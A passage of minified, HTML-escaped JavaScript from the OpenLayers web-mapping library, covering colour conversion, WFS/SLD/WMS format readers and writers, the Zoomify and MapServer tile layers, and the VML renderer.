c=1;4>c;c++)a+=b.charAt(c)+b.charAt(c)}0==a.indexOf("#")&amp;&amp;(a=a.substring(1));b=a.substring(0,2);c=a.substring(2,4);a=a.substring(4,6);return new OpenLayers.Rico.Color(parseInt(b,16),parseInt(c,16),parseInt(a,16))}; OpenLayers.Rico.Color.createColorFromBackground=function(a){var b=OpenLayers.Element.getStyle(OpenLayers.Util.getElement(a),"backgroundColor");return"transparent"==b&amp;&amp;a.parentNode?OpenLayers.Rico.Color.createColorFromBackground(a.parentNode):null==b?new OpenLayers.Rico.Color(255,255,255):0==b.indexOf("rgb(")?(a=b.substring(4,b.length-1).split(","),new OpenLayers.Rico.Color(parseInt(a[0]),parseInt(a[1]),parseInt(a[2]))):0==b.indexOf("#")?OpenLayers.Rico.Color.createFromHex(b):new OpenLayers.Rico.Color(255, 255,255)}; OpenLayers.Rico.Color.HSBtoRGB=function(a,b,c){var d=0,e=0,f=0;if(0==b)f=e=d=parseInt(255*c+0.5);else{a=6*(a-Math.floor(a));var g=a-Math.floor(a),h=c*(1-b),k=c*(1-b*g);b=c*(1-b*(1-g));switch(parseInt(a)){case 0:d=255*c+0.5;e=255*b+0.5;f=255*h+0.5;break;case 1:d=255*k+0.5;e=255*c+0.5;f=255*h+0.5;break;case 2:d=255*h+0.5;e=255*c+0.5;f=255*b+0.5;break;case 3:d=255*h+0.5;e=255*k+0.5;f=255*c+0.5;break;case 4:d=255*b+0.5;e=255*h+0.5;f=255*c+0.5;break;case 5:d=255*c+0.5,e=255*h+0.5,f=255*k+0.5}}return{r:parseInt(d),g:parseInt(e), b:parseInt(f)}};OpenLayers.Rico.Color.RGBtoHSB=function(a,b,c){var d,e=a>b?a:b;c>e&amp;&amp;(e=c);var f=a&lt;b?a:b;c&lt;f&amp;&amp;(f=c);d=0!=e?(e-f)/e:0;if(0==d)a=0;else{var g=(e-a)/(e-f),h=(e-b)/(e-f);c=(e-c)/(e-f);a=(a==e?c-h:b==e?2+g-c:4+h-g)/6;0>a&amp;&amp;(a+=1)}return{h:a,s:d,b:e/255}};OpenLayers.Style2=OpenLayers.Class({id:null,name:null,title:null,description:null,layerName:null,isDefault:!1,rules:null,initialize:function(a){OpenLayers.Util.extend(this,a);this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_")},destroy:function(){for(var a=0,b=this.rules.length;a&lt;b;a++)this.rules[a].destroy();delete this.rules},clone:function(){var a=OpenLayers.Util.extend({},this);if(this.rules){a.rules=[];for(var b=0,c=this.rules.length;b&lt;c;++b)a.rules.push(this.rules[b].clone())}return new OpenLayers.Style2(a)}, CLASS_NAME:"OpenLayers.Style2"});OpenLayers.Format.WFS=OpenLayers.Class(OpenLayers.Format.GML,{layer:null,wfsns:"http://www.opengis.net/wfs",ogcns:"http://www.opengis.net/ogc",initialize:function(a,b){OpenLayers.Format.GML.prototype.initialize.apply(this,[a]);this.layer=b;this.layer.featureNS&amp;&amp;(this.featureNS=this.layer.featureNS);this.layer.options.geometry_column&amp;&amp;(this.geometryName=this.layer.options.geometry_column);this.layer.options.typename&amp;&amp;(this.featureName=this.layer.options.typename)},write:function(a){var b=this.createElementNS(this.wfsns, "wfs:Transaction");b.setAttribute("version","1.0.0");b.setAttribute("service","WFS");for(var c=0;c&lt;a.length;c++)switch(a[c].state){case OpenLayers.State.INSERT:b.appendChild(this.insert(a[c]));break;case OpenLayers.State.UPDATE:b.appendChild(this.update(a[c]));break;case OpenLayers.State.DELETE:b.appendChild(this.remove(a[c]))}return OpenLayers.Format.XML.prototype.write.apply(this,[b])},createFeatureXML:function(a){var b=this.buildGeometryNode(a.geometry),c=this.createElementNS(this.featureNS,"feature:"+ this.geometryName);c.appendChild(b);b=this.createElementNS(this.featureNS,"feature:"+this.featureName);b.appendChild(c);for(var d in a.attributes){var c=this.createTextNode(a.attributes[d]),e=d;-1!=d.search(":")&amp;&amp;(e=d.split(":")[1]);e=this.createElementNS(this.featureNS,"feature:"+e);e.appendChild(c);b.appendChild(e)}return b},insert:function(a){var b=this.createElementNS(this.wfsns,"wfs:Insert");b.appendChild(this.createFeatureXML(a));return b},update:function(a){a.fid||OpenLayers.Console.userError(OpenLayers.i18n("noFID")); var b=this.createElementNS(this.wfsns,"wfs:Update");b.setAttribute("typeName",this.featurePrefix+":"+this.featureName);b.setAttribute("xmlns:"+this.featurePrefix,this.featureNS);var c=this.createElementNS(this.wfsns,"wfs:Property"),d=this.createElementNS(this.wfsns,"wfs:Name"),e=this.createTextNode(this.geometryName);d.appendChild(e);c.appendChild(d);d=this.createElementNS(this.wfsns,"wfs:Value");e=this.buildGeometryNode(a.geometry);a.layer&amp;&amp;e.setAttribute("srsName",a.layer.projection.getCode()); d.appendChild(e);c.appendChild(d);b.appendChild(c);for(var f in a.attributes)c=this.createElementNS(this.wfsns,"wfs:Property"),d=this.createElementNS(this.wfsns,"wfs:Name"),d.appendChild(this.createTextNode(f)),c.appendChild(d),d=this.createElementNS(this.wfsns,"wfs:Value"),d.appendChild(this.createTextNode(a.attributes[f])),c.appendChild(d),b.appendChild(c);c=this.createElementNS(this.ogcns,"ogc:Filter");f=this.createElementNS(this.ogcns,"ogc:FeatureId");f.setAttribute("fid",a.fid);c.appendChild(f); b.appendChild(c);return b},remove:function(a){if(!a.fid)return OpenLayers.Console.userError(OpenLayers.i18n("noFID")),!1;var b=this.createElementNS(this.wfsns,"wfs:Delete");b.setAttribute("typeName",this.featurePrefix+":"+this.featureName);b.setAttribute("xmlns:"+this.featurePrefix,this.featureNS);var c=this.createElementNS(this.ogcns,"ogc:Filter"),d=this.createElementNS(this.ogcns,"ogc:FeatureId");d.setAttribute("fid",a.fid);c.appendChild(d);b.appendChild(c);return b},destroy:function(){this.layer= null},CLASS_NAME:"OpenLayers.Format.WFS"});OpenLayers.Format.SLD.v1_0_0_GeoServer=OpenLayers.Class(OpenLayers.Format.SLD.v1_0_0,{version:"1.0.0",profile:"GeoServer",readers:OpenLayers.Util.applyDefaults({sld:OpenLayers.Util.applyDefaults({Priority:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.priority=c)},VendorOption:function(a,b){b.vendorOptions||(b.vendorOptions={});b.vendorOptions[a.getAttribute("name")]=this.getChildValue(a)},TextSymbolizer:function(a,b){OpenLayers.Format.SLD.v1_0_0.prototype.readers.sld.TextSymbolizer.apply(this, arguments);var c=this.multipleSymbolizers?b.symbolizers[b.symbolizers.length-1]:b.symbolizer.Text;void 0===c.graphic&amp;&amp;(c.graphic=!1)}},OpenLayers.Format.SLD.v1_0_0.prototype.readers.sld)},OpenLayers.Format.SLD.v1_0_0.prototype.readers),writers:OpenLayers.Util.applyDefaults({sld:OpenLayers.Util.applyDefaults({Priority:function(a){return this.writers.sld._OGCExpression.call(this,"sld:Priority",a)},VendorOption:function(a){return this.createElementNSPlus("sld:VendorOption",{attributes:{name:a.name}, value:a.value})},TextSymbolizer:function(a){var b=OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld.TextSymbolizer.apply(this,arguments);!1!==a.graphic&amp;&amp;(a.externalGraphic||a.graphicName)&amp;&amp;this.writeNode("Graphic",a,b);"priority"in a&amp;&amp;this.writeNode("Priority",a.priority,b);return this.addVendorOptions(b,a)},PointSymbolizer:function(a){var b=OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld.PointSymbolizer.apply(this,arguments);return this.addVendorOptions(b,a)},LineSymbolizer:function(a){var b= OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld.LineSymbolizer.apply(this,arguments);return this.addVendorOptions(b,a)},PolygonSymbolizer:function(a){var b=OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld.PolygonSymbolizer.apply(this,arguments);return this.addVendorOptions(b,a)}},OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld)},OpenLayers.Format.SLD.v1_0_0.prototype.writers),addVendorOptions:function(a,b){if(b.vendorOptions)for(var c in b.vendorOptions)this.writeNode("VendorOption",{name:c, value:b.vendorOptions[c]},a);return a},CLASS_NAME:"OpenLayers.Format.SLD.v1_0_0_GeoServer"});OpenLayers.Layer.Boxes=OpenLayers.Class(OpenLayers.Layer.Markers,{drawMarker:function(a){var b=this.map.getLayerPxFromLonLat({lon:a.bounds.left,lat:a.bounds.top}),c=this.map.getLayerPxFromLonLat({lon:a.bounds.right,lat:a.bounds.bottom});null==c||null==b?a.display(!1):(b=a.draw(b,{w:Math.max(1,c.x-b.x),h:Math.max(1,c.y-b.y)}),a.drawn||(this.div.appendChild(b),a.drawn=!0))},removeMarker:function(a){OpenLayers.Util.removeItem(this.markers,a);null!=a.div&amp;&amp;a.div.parentNode==this.div&amp;&amp;this.div.removeChild(a.div)}, CLASS_NAME:"OpenLayers.Layer.Boxes"});OpenLayers.Format.WFSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.WFSCapabilities.v1,{readers:{wfs:OpenLayers.Util.applyDefaults({Service:function(a,b){b.service={};this.readChildNodes(a,b.service)},Fees:function(a,b){var c=this.getChildValue(a);c&amp;&amp;"none"!=c.toLowerCase()&amp;&amp;(b.fees=c)},AccessConstraints:function(a,b){var c=this.getChildValue(a);c&amp;&amp;"none"!=c.toLowerCase()&amp;&amp;(b.accessConstraints=c)},OnlineResource:function(a,b){var c=this.getChildValue(a);c&amp;&amp;"none"!=c.toLowerCase()&amp;&amp;(b.onlineResource= c)},Keywords:function(a,b){var c=this.getChildValue(a);c&amp;&amp;"none"!=c.toLowerCase()&amp;&amp;(b.keywords=c.split(", "))},Capability:function(a,b){b.capability={};this.readChildNodes(a,b.capability)},Request:function(a,b){b.request={};this.readChildNodes(a,b.request)},GetFeature:function(a,b){b.getfeature={href:{},formats:[]};this.readChildNodes(a,b.getfeature)},ResultFormat:function(a,b){for(var c=a.childNodes,d,e=0;e&lt;c.length;e++)d=c[e],1==d.nodeType&amp;&amp;b.formats.push(d.nodeName)},DCPType:function(a,b){this.readChildNodes(a, b)},HTTP:function(a,b){this.readChildNodes(a,b.href)},Get:function(a,b){b.get=a.getAttribute("onlineResource")},Post:function(a,b){b.post=a.getAttribute("onlineResource")},SRS:function(a,b){var c=this.getChildValue(a);c&amp;&amp;(b.srs=c)}},OpenLayers.Format.WFSCapabilities.v1.prototype.readers.wfs)},CLASS_NAME:"OpenLayers.Format.WFSCapabilities.v1_0_0"});OpenLayers.Format.WMSCapabilities.v1_3=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1,{readers:{wms:OpenLayers.Util.applyDefaults({WMS_Capabilities:function(a,b){this.readChildNodes(a,b)},LayerLimit:function(a,b){b.layerLimit=parseInt(this.getChildValue(a))},MaxWidth:function(a,b){b.maxWidth=parseInt(this.getChildValue(a))},MaxHeight:function(a,b){b.maxHeight=parseInt(this.getChildValue(a))},BoundingBox:function(a,b){var c=OpenLayers.Format.WMSCapabilities.v1.prototype.readers.wms.BoundingBox.apply(this, [a,b]);c.srs=a.getAttribute("CRS");b.bbox[c.srs]=c},CRS:function(a,b){this.readers.wms.SRS.apply(this,[a,b])},EX_GeographicBoundingBox:function(a,b){b.llbbox=[];this.readChildNodes(a,b.llbbox)},westBoundLongitude:function(a,b){b[0]=this.getChildValue(a)},eastBoundLongitude:function(a,b){b[2]=this.getChildValue(a)},southBoundLatitude:function(a,b){b[1]=this.getChildValue(a)},northBoundLatitude:function(a,b){b[3]=this.getChildValue(a)},MinScaleDenominator:function(a,b){b.maxScale=parseFloat(this.getChildValue(a)).toPrecision(16)}, MaxScaleDenominator:function(a,b){b.minScale=parseFloat(this.getChildValue(a)).toPrecision(16)},Dimension:function(a,b){var c={name:a.getAttribute("name").toLowerCase(),units:a.getAttribute("units"),unitsymbol:a.getAttribute("unitSymbol"),nearestVal:"1"===a.getAttribute("nearestValue"),multipleVal:"1"===a.getAttribute("multipleValues"),"default":a.getAttribute("default")||"",current:"1"===a.getAttribute("current"),values:this.getChildValue(a).split(",")};b.dimensions[c.name]=c},Keyword:function(a, b){var c={value:this.getChildValue(a),vocabulary:a.getAttribute("vocabulary")};b.keywords&amp;&amp;b.keywords.push(c)}},OpenLayers.Format.WMSCapabilities.v1.prototype.readers.wms),sld:{UserDefinedSymbolization:function(a,b){this.readers.wms.UserDefinedSymbolization.apply(this,[a,b]);b.userSymbols.inlineFeature=1==parseInt(a.getAttribute("InlineFeature"));b.userSymbols.remoteWCS=1==parseInt(a.getAttribute("RemoteWCS"))},DescribeLayer:function(a,b){this.readers.wms.DescribeLayer.apply(this,[a,b])},GetLegendGraphic:function(a, b){this.readers.wms.GetLegendGraphic.apply(this,[a,b])}}},CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1_3"});OpenLayers.Layer.Zoomify=OpenLayers.Class(OpenLayers.Layer.Grid,{size:null,isBaseLayer:!0,standardTileSize:256,tileOriginCorner:"tl",numberOfTiers:0,tileCountUpToTier:null,tierSizeInTiles:null,tierImageSize:null,initialize:function(a,b,c,d){this.initializeZoomify(c);OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a,b,c,{},d])},initializeZoomify:function(a){var b=a.clone();this.size=a.clone();a=new OpenLayers.Size(Math.ceil(b.w/this.standardTileSize),Math.ceil(b.h/this.standardTileSize));this.tierSizeInTiles= [a];for(this.tierImageSize=[b];b.w>this.standardTileSize||b.h>this.standardTileSize;)b=new OpenLayers.Size(Math.floor(b.w/2),Math.floor(b.h/2)),a=new OpenLayers.Size(Math.ceil(b.w/this.standardTileSize),Math.ceil(b.h/this.standardTileSize)),this.tierSizeInTiles.push(a),this.tierImageSize.push(b);this.tierSizeInTiles.reverse();this.tierImageSize.reverse();this.numberOfTiers=this.tierSizeInTiles.length;b=[1];this.tileCountUpToTier=[0];for(a=1;a&lt;this.numberOfTiers;a++)b.unshift(Math.pow(2,a)),this.tileCountUpToTier.push(this.tierSizeInTiles[a- 1].w*this.tierSizeInTiles[a-1].h+this.tileCountUpToTier[a-1]);this.serverResolutions||(this.serverResolutions=b)},destroy:function(){OpenLayers.Layer.Grid.prototype.destroy.apply(this,arguments);this.tileCountUpToTier.length=0;this.tierSizeInTiles.length=0;this.tierImageSize.length=0},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.Zoomify(this.name,this.url,this.size,this.options));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},getURL:function(a){a=this.adjustBounds(a);var b= this.getServerResolution(),c=Math.round((a.left-this.tileOrigin.lon)/(b*this.tileSize.w));a=Math.round((this.tileOrigin.lat-a.top)/(b*this.tileSize.h));b=this.getZoomForResolution(b);c="TileGroup"+Math.floor((c+a*this.tierSizeInTiles[b].w+this.tileCountUpToTier[b])/256)+"/"+b+"-"+c+"-"+a+".jpg";b=this.url;OpenLayers.Util.isArray(b)&amp;&amp;(b=this.selectUrl(c,b));return b+c},getImageSize:function(){if(0&lt;arguments.length){var a=this.adjustBounds(arguments[0]),b=this.getServerResolution(),c=Math.round((a.left- this.tileOrigin.lon)/(b*this.tileSize.w)),a=Math.round((this.tileOrigin.lat-a.top)/(b*this.tileSize.h)),b=this.getZoomForResolution(b),d=this.standardTileSize,e=this.standardTileSize;c==this.tierSizeInTiles[b].w-1&amp;&amp;(d=this.tierImageSize[b].w%this.standardTileSize);a==this.tierSizeInTiles[b].h-1&amp;&amp;(e=this.tierImageSize[b].h%this.standardTileSize);return new OpenLayers.Size(d,e)}return this.tileSize},setMap:function(a){OpenLayers.Layer.Grid.prototype.setMap.apply(this,arguments);this.tileOrigin=new OpenLayers.LonLat(this.map.maxExtent.left, this.map.maxExtent.top)},CLASS_NAME:"OpenLayers.Layer.Zoomify"});OpenLayers.Layer.MapServer=OpenLayers.Class(OpenLayers.Layer.Grid,{DEFAULT_PARAMS:{mode:"map",map_imagetype:"png"},initialize:function(a,b,c,d){OpenLayers.Layer.Grid.prototype.initialize.apply(this,arguments);this.params=OpenLayers.Util.applyDefaults(this.params,this.DEFAULT_PARAMS);if(null==d||null==d.isBaseLayer)this.isBaseLayer="true"!=this.params.transparent&amp;&amp;!0!=this.params.transparent},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.MapServer(this.name,this.url,this.params,this.getOptions())); return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},getURL:function(a){a=this.adjustBounds(a);a=[a.left,a.bottom,a.right,a.top];var b=this.getImageSize();return this.getFullRequestString({mapext:a,imgext:a,map_size:[b.w,b.h],imgx:b.w/2,imgy:b.h/2,imgxy:[b.w,b.h]})},getFullRequestString:function(a,b){var c=null==b?this.url:b,d=OpenLayers.Util.extend({},this.params),d=OpenLayers.Util.extend(d,a),e=OpenLayers.Util.getParameterString(d);OpenLayers.Util.isArray(c)&amp;&amp;(c=this.selectUrl(e,c)); var e=OpenLayers.Util.upperCaseObject(OpenLayers.Util.getParameters(c)),f;for(f in d)f.toUpperCase()in e&amp;&amp;delete d[f];e=OpenLayers.Util.getParameterString(d);d=c;e=e.replace(/,/g,"+");""!=e&amp;&amp;(f=c.charAt(c.length-1),d="&amp;"==f||"?"==f?d+e:-1==c.indexOf("?")?d+("?"+e):d+("&amp;"+e));return d},CLASS_NAME:"OpenLayers.Layer.MapServer"});OpenLayers.Renderer.VML=OpenLayers.Class(OpenLayers.Renderer.Elements,{xmlns:"urn:schemas-microsoft-com:vml",symbolCache:{},offset:null,initialize:function(a){if(this.supported()){if(!document.namespaces.olv){document.namespaces.add("olv",this.xmlns);for(var b=document.createStyleSheet(),c="shape rect oval fill stroke imagedata group textbox".split(" "),d=0,e=c.length;d&lt;e;d++)b.addRule("olv\\:"+c[d],"behavior: url(#default#VML); position: absolute; display: inline-block;")}OpenLayers.Renderer.Elements.prototype.initialize.apply(this, arguments)}},supported:function(){return!!document.namespaces},setExtent:function(a,b){var c=OpenLayers.Renderer.Elements.prototype.setExtent.apply(this,arguments),d=this.getResolution(),e=a.left/d|0,d=a.top/d-this.size.h|0;b||!this.offset?(this.offset={x:e,y:d},d=e=0):(e-=this.offset.x,d-=this.offset.y);this.root.coordorigin=e-this.xOffset+" "+d;for(var e=[this.root,this.vectorRoot,this.textRoot],f=0,g=e.length;f&lt;g;++f)d=e[f],d.coordsize=this.size.w+" "+this.size.h;this.root.style.flip="y";return c}, setSize:function(a){OpenLayers.Renderer.prototype.setSize.apply(this,arguments);for(var b=[this.rendererRoot,this.root,this.vectorRoot,this.textRoot],c=this.size.w+"px",d=this.size.h+"px",e,f=0,g=b.length;f&lt;g;++f)e=b[f],e.style.width=c,e.style.height=d},getNodeType:function(a,b){var c=null;switch(a.CLASS_NAME){case "OpenLayers.Geometry.Point":c=b.externalGraphic?"olv:rect":this.isComplexSymbol(b.graphicName)?"olv:shape":"olv:oval";break;case "OpenLayers.Geometry.Rectangle":c="olv:rect";break;case "OpenLayers.Geometry.LineString":case "OpenLayers.Geometry.LinearRing":case "OpenLayers.Geometry.Polygon":case "OpenLayers.Geometry.Curve":c= "olv:shape"}return c},setStyle:function(a,b,c,d){b=b||a._style;c=c||a._options;var e=b.fillColor,f=b.title||b.graphicTitle;f&amp;&amp;(a.title=f);if("OpenLayers.Geometry.Point"===a._geometryClass)if(b.externalGraphic){c.isFilled=!0;var e=b.graphicWidth||b.graphicHeight,f=b.graphicHeight||b.graphicWidth,e=e?e:2*b.pointRadius,f=f?f:2*b.pointRadius,g=this.getResolution(),h=void 0!=b.graphicXOffset?b.graphicXOffset:-(0.5*e),k=void 0!=b.graphicYOffset?b.graphicYOffset:-(0.5*f);a.style.left=((d.x-this.featureDx)/ g-this.offset.x+h|0)+"px";a.style.top=(d.y/g-this.offset.y-(k+f)|0)+"px";a.style.width=e+"px";a.style.height=f+"px";a.style.flip="y";e="none";c.isStroked=!1}else this.isComplexSymbol(b.graphicName)?(f=this.importSymbol(b.graphicName),a.path=f.path,a.coordorigin=f.left+","+f.bottom,f=f.size,a.coordsize=f+","+f,this.drawCircle(a,d,b.pointRadius),a.style.flip="y"):this.drawCircle(a,d,b.pointRadius);c.isFilled?a.fillcolor=e:a.filled="false";d=a.getElementsByTagName("fill");d=0==d.length?null:d[0];c.isFilled? (d||(d=this.createNode("olv:fill",a.id+"_fill")),d.opacity=b.fillOpacity,"OpenLayers.Geometry.Point"===a._geometryClass&amp;&amp;b.externalGraphic&amp;&amp;(b.graphicOpacity&amp;&amp;(d.opacity=b.graphicOpacity),d.src=b.externalGraphic,d.type="frame",b.graphicWidth&amp;&amp;b.graphicHeight||(d.aspect="atmost")),d.parentNode!=a&amp;&amp;a.appendChild(d)):d&amp;&amp;a.removeChild(d);e=b.rotation;if(void 0!==e||void 0!==a._rotation)a._rotation=e,b.externalGraphic?(this.graphicRotate(a,h,k,b),d.opacity=0):"OpenLayers.Geometry.Point"===a._geometryClass&amp;&amp; (a.style.rotation=e||0);h=a.getElementsByTagName("stroke");h=0==h.length?null:h[0];c.isStroked?(h||(h=this.createNode("olv:stroke",a.id+"_stroke"),a.appendChild(h)),h.on=!0,h.color=b.strokeColor,h.weight=b.strokeWidth+"px",h.opacity=b.strokeOpacity,h.endcap="butt"==b.strokeLinecap?"flat":b.strokeLinecap||"round",b.strokeDashstyle&amp;&amp;(h.dashstyle=this.dashStyle(b))):(a.stroked=!1,h&amp;&amp;(h.on=!1));"inherit"!=b.cursor&amp;&amp;null!=b.cursor&amp;&amp;(a.style.cursor=b.cursor);return a},graphicRotate:function(a,b,c,d){d= d||a._style;var e=d.rotation||0,f,g;if(d.graphicWidth&amp;&amp;d.graphicHeight){g=Math.max(d.graphicWidth,d.graphicHeight);f=d.graphicWidth/d.graphicHeight;var h=Math.round(d.graphicWidth||g*f),k=Math.round(d.graphicHeight||g);a.style.width=h+"px";a.style.height=k+"px";var l=document.getElementById(a.id+"_image");l||(l=this.createNode("olv:imagedata",a.id+"_image"),a.appendChild(l));l.style.width=h+"px";l.style.height=k+"px";l.src=d.externalGraphic;l.style.filter="progid:DXImageTransform.Microsoft.AlphaImageLoader(src='', sizingMethod='scale')"; l=e*Math.PI/180;e=Math.sin(l);l=Math.cos(l);e="progid:DXImageTransform.Microsoft.Matrix(M11="+l+",M12="+-e+",M21="+e+",M22="+l+",SizingMethod='auto expand')\n";(l=d.graphicOpacity||d.fillOpacity)&amp;&amp;1!=l&amp;&amp;(e+="progid:DXImageTransform.Microsoft.BasicImage(opacity="+l+")\n");a.style.filter=e;e=new OpenLayers.Geometry.Point(-b,-c);h=(new OpenLayers.Bounds(0,0,h,k)).toGeometry();h.rotate(d.rotation,e);h=h.getBounds();a.style.left=Math.round(parseInt(a.style.left)+h.left)+"px";a.style.top=Math.round(parseInt(a.style.top)- h.bottom)+"px"}else{var m=new Image;m.onreadystatechange=OpenLayers.Function.bind(function(){if("complete"==m.readyState||"interactive"==m.readyState)f=m.width/m.height,g=Math.max(2*d.pointRadius,d.graphicWidth||0,d.graphicHeight||0),b*=f,d.graphicWidth=g*f,d.graphicHeight=g,this.graphicRotate(a,b,c,d)},this);m.src=d.externalGraphic}},postDraw:function(a){a.style.visibility="visible";var b=a._style.fillColor,c=a._style.strokeColor;"none"==b&amp;&amp;a.fillcolor!=b&amp;&amp;(a.fillcolor=b);"none"==c&amp;&amp;a.strokecolor!= c&amp;&amp;(a.strokecolor=c)},setNodeDimension:function(a,b){var c=b.getBounds();if(c){var d=this.getResolution(),c=new OpenLayers.Bounds((c.left-this.featureDx)/d-this.offset.x|0,c.bottom/d-this.offset.y|0,(c.right-this.featureDx)/d-this.offset.x|0,c.top/d-this.offset.y|0);a.style.left=c.left+"px";a.style.top=c.top+"px";a.style.width=c.getWidth()+"px";a.style.height=c.getHeight()+"px";a.coordorigin=c.left+" "+c.top;a.coordsize=c.getWidth()+" "+c.getHeight()}},dashStyle:function(a){a=a.strokeDashstyle;switch(a){case "solid":case "dot":case "dash":case "dashdot":case "longdash":case "longdashdot":return a; default:return a=a.split(/[ ,]/),2==a.length?1*a[0]>=2*a[1]?"longdash":1==a[0]||1==a[1]?"dot":"dash":4==a.length?1*a[0]>=2*a[1]?"longdashdot":"dashdot":"solid"}},createNode:function(a,b){var c=document.createElement(a);b&amp;&amp;(c.id=b);c.unselectable="on";c.onselectstart=OpenLayers.Function.False;return c},nodeTypeCompare:function(a,b){var c=b,d=c.indexOf(":");-1!=d&amp;&amp;(c=c.substr(d+1));var e=a.nodeName,d=e.indexOf(":");-1!=d&amp;&amp;(e=e.substr(d+1));return c==e},createRenderRoot:function(){return this.nodeFactory(this.container.id+ "_vmlRoot","div")},createRoot:function(a){return this.nodeFactory(this.container.id+a,"olv:group")},drawPoint:function(a,b){return this.drawCircle(a,b,1)},drawCircle:function(a,b,c){if(!isNaN(b.x)&amp;&amp;!isNaN(b.y)){var d=this.getResolution();a.style.left=((b.x-this.featureDx)/d-this.offset.x|0)-c+"px";a.style.top=(b.y/d-this.offset.y|0)-c+"px";b=2*c;a.style.width=b+"px";a.style.height=b+"px";return a}return!1},drawLineString:function(a,b){return this.drawLine(a,b,!1)},drawLinearRing:function(a,b){return this.drawLine(a, b,!0)},drawLine:function(a,b,c){this.setNodeDimension(a,b);for(var d=this.getResolution(),e=b.components.length,f=Array(e),g,h,k=0;k&lt;e;k++)g=b.components[k],h=(g.x-this.featureDx)/d-this.offset.x|0,g=g.y/d-this.offset.y|0,f[k]=" "+h+","+g+" l ";b=c?" x e":" e";a.path="m"+f.join("")+b;return a},drawPolygon:function(a,b){this.setNodeDimension(a,b);var c=this.getResolution(),d=[],e,f,g,h,k,l,m,n,p,q;e=0;for(f=b.components.length;e&lt;f;e++){d.push("m");g=b.components[e].components;h=0===e;l=k=null;m=0; for(n=g.length;m&lt;n;m++)p=g[m],q=(p.x-this.featureDx)/c-this.offset.x|0,p=p.y/c-this.offset.y|0,q=" "+q+","+p,d.push(q),0==m&amp;&amp;d.push(" l"),h||(k?k!=q&amp;&amp;(l?l!=q&amp;&amp;(h=!0):l=q):k=q);d.push(h?" x ":" ")}d.push("e");a.path=d.join("");return a},drawRectangle:function(a,b){var c=this.getResolution();a.style.left=((b.x-this.featureDx)/c-this.offset.x|0)+"px";a.style.top=(b.y/c-this.offset.y|0)+"px";a.style.width=(b.width/c|0)+"px";a.style.height=(b.height/c|0)+"px";return a},drawText:function(a,b,c){var d=this.nodeFactory(a+ this.LABEL_ID_SUFFIX,"olv:rect"),e=this.nodeFactory(a+this.LABEL_ID_SUFFIX+"_textbox","olv:textbox"),f=this.getResolution();d.style.left=((c.x-this.featureDx)/f-this.offset.x|0)+"px";d.style.top=(c.y/f-this.offset.y|0)+"px";d.style.flip="y";e.innerText=b.label;"inherit"!=b.cursor&amp;&amp;null!=b.cursor&amp;&amp;(e.style.cursor=b.cursor);b.fontColor&amp;&amp;(e.style.color=b.fontColor);b.fontOpacity&amp;&amp;(e.style.filter="alpha(opacity="+100*b.fontOpacity+")");b.fontFamily&amp;&amp;(e.style.fontFamily=b.fontFamily);b.fontSize&amp;&amp;(e.style.fontSize= b.fontSize);b.fontWeight&amp;&amp;(e.style.fontWeight=b.fontWeight);b.fontStyle&amp;&amp;(e.style.fontStyle=b.fontStyle);!0===b.labelSelect&amp;&amp;(d._featureId=a,e._featureId=a,e._geometry=c,e._geometryClass=c.CLASS_NAME);e.style.whiteSpace="nowrap";e.inset="1px,0px,0px,0px";d.parentNode||(d.appendChild(e),this.textRoot.appendChild(d));b=b.labelAlign||"cm";1==b.length&amp;&amp;(b+="m");a=e.clientWidth*OpenLayers.Renderer.VML.LABEL_SHIFT[b.substr(0,1)];e=e.clientHeight*OpenLayers.Renderer.VML.LABEL_SHIFT[b.substr(1,1)];d.style.left= parseInt(d.style.left)-a-1+"px";d.style.top=parseInt(d.style.top)+e+"px"},moveRoot:function(a){var b=this.map.getLayer(a.container.id);b instanceof OpenLayers.Layer.Vector.RootContainer&amp;&amp;(b=this.map.getLayer(this.container.id));b&amp;&amp;b.renderer.clear();OpenLayers.Renderer.Elements.prototype.moveRoot.apply(this,arguments);b&amp;&amp;b.redraw()},importSymbol:function(a){var b=this.container.id+"-"+a,c=this.symbolCache[b];if(c)return c;c=OpenLayers.Renderer.symbol[a];if(!c)throw Error(a+" is not a valid symbol name"); a=new OpenLayers.Bounds(Number.MAX_VALUE,Number.MAX_VALUE,0,0);for(var d=["m"],e=0;e&lt;c.length;e+=2){var f=c[e],g=c[e+1];a.left=Math.min(a.left,f);a.bottom=Math.min(a.bottom,g);a.right=Math.max(a.right,f);a.top=Math.max(a.top,g);d.push(f);d.push(g);0==e&amp;&amp;d.push("l")}d.push("x e");c=d.join(" ");d=(a.getWidth()-a.getHeight())/2;0&lt;d?(a.bottom-=d,a.top+=d):(a.left+=d,a.right-=d);c={path:c,size:a.getWidth(),left:a.left,bottom:a.bottom};return this.symbolCache[b]=c},CLASS_NAME:"OpenLayers.Renderer.VML"}); OpenLayers.Renderer.VML.LABEL_SHIFT={l:0,c:0.5,r:1,t:0,m:0.5,b:1};OpenLayers.Control.CacheRead=OpenLayers.Class(OpenLayers.Control,{fetchEvent:"tileloadstart",layers:null,autoActivate:!0,setMap:function(a){OpenLayers.Control.prototype.setMap.apply(this,arguments);var b,c=this.layers||a.layers;for(b=c.length-1;0&lt;=b;--b)this.addLayer({layer:c[b]});if(!this.layers)a.events.on({addlayer:this.addLayer,removeLayer:this.removeLayer,scope:this})},addLayer:function(a){a.layer.events.register(this.fetchEvent,this,this.fetch)},removeLayer:function(a){a.layer.events.unregister(this.fetchEvent, this,this.fetch)},fetch:function(a){if(this.active&amp;&amp;window.localStorage&amp;&amp;a.tile instanceof OpenLayers.Tile.Image){var 